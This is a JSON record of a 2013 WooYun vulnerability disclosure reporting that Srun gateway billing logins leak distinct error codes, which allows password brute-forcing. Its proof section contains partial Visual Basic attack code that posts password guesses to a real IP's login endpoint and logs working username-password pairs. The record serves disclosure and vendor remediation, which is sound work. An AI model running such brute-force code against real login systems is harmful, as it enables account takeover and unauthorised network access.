{"id": 7358, "wybug_id": "wooyun-2013-042004", "wybug_title": "暴力破解深澜网关计费系统用户密码", "wybug_corp": "深澜软件", "wybug_author": "headhuanglan", "wybug_date": "2013-11-05 10:19", "wybug_open_date": "2013-12-20 10:20", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-20：\t细节向公众公开  简要描述： 可以通过判断服务器返回值的方式，暴力破解深澜网关 详细说明：  post到服务器的数据username=xxx&password={TEXT}xxxxx&drop=0&type=1&n=100然后服务器会返回user_tab_error  username_error   password_error  ername_error等返回值，这时候可以通过判断返回值对用户的密码进行暴力破解   漏洞证明：  \n\n核心代码\npostdata = \"username=\" + CStr(uname) + \"&password={TEXT}\" + pwd + \"&drop=0&type=1&n=100\"r = HttpPost(\"http://202.4.130.95/cgi-bin/do_login\", postdata) Select Case rCase \"user_tab_error\":         Label4.Caption = \"认证程序未启动\"  Case \"username_error\":           Label4.Caption = \"用户名错误\"   Case \"password_error\":          Label4.Caption = \"密码错误\"       Case \"user_tab_error\":           Label4.Caption = \"认证程序未启动       Case \"username_error\":            Label4.Caption = \"用户名错误\"        Case \"non_auth_error\":            Label4.Caption = \"您无须认证，可直接上网\"        Case \"password_error\":            Label4.Caption = \"密码错误\"        Case \"status_error\":            Text3.Text = Text3.Text + CStr(uname) + \" \" + pwd + vbCrLf             Timer1.Interval = 0             flag = 1           Call Command1_Click        Case \"available_error\":            Label4.Caption = \"用户已禁用\"        Case \"ip_exist_error\":             Text3.Text = Text3.Text + CStr(uname) + \" \" + pwd + vbCrLf              Timer1.Interval = 0              flag = 1             Call Command1_Click        Case \"usernum_error\":            Text3.Text = Text3.Text + CStr(uname) + \" \" + pwd + vbCrLf              Timer1.Interval = 0               flag = 1           Call Command1_Click        Case \"online_num_error\":            Text3.Text = Text3.Text + CStr(uname) + \" \" + pwd + vbCrLf              Timer1.Interval = 0               flag = 1           Call Command1_Click       Case \"mode_error\":            Label4.Caption = \"系统已禁止WEB方式登录，请使用客户端\"        Case \"time_policy_error\":           Label4.Caption = \"当前时段不允许连接\"        Case \"flux_error\":            Text3.Text = Text3.Text + CStr(uname) + \" \" + pwd + vbCrLf              Timer1.Interval = 0               flag = 1           Call Command1_Click        Case \"minutes_error\":             Text3.Text = Text3.Text + CStr(uname) + \" \" + pwd + vbCrLf              Timer1.Interval = 0                flag = 1           Call Command1_Click        Case \"ip_error\":           Label4.Caption = \"您的IP地址不合法\"        Case \"mac_error\":           Label4.Caption = \"您的MAC地址不合法\"        Case \"sync_error\":           Label4.Caption = \"您的资料已修改，正在等待同步，请2分钟后再试。\"        Case Else            Text3.Text = Text3.Text + CStr(uname) + \" \" + pwd + vbCrLf             Timer1.Interval = 0              flag = 1           Call Command1_Click          End Select\n   修复方案：  提交的验证请求加session？？？你们更专业   版权声明：转载请注明来源 headhuanglan@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-11-09 19:35 厂商回复： CNVD未能直接复现所述情况，所述系统多部署于内部网关，根据图片以及所述代码情况进行确认，rank 15 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}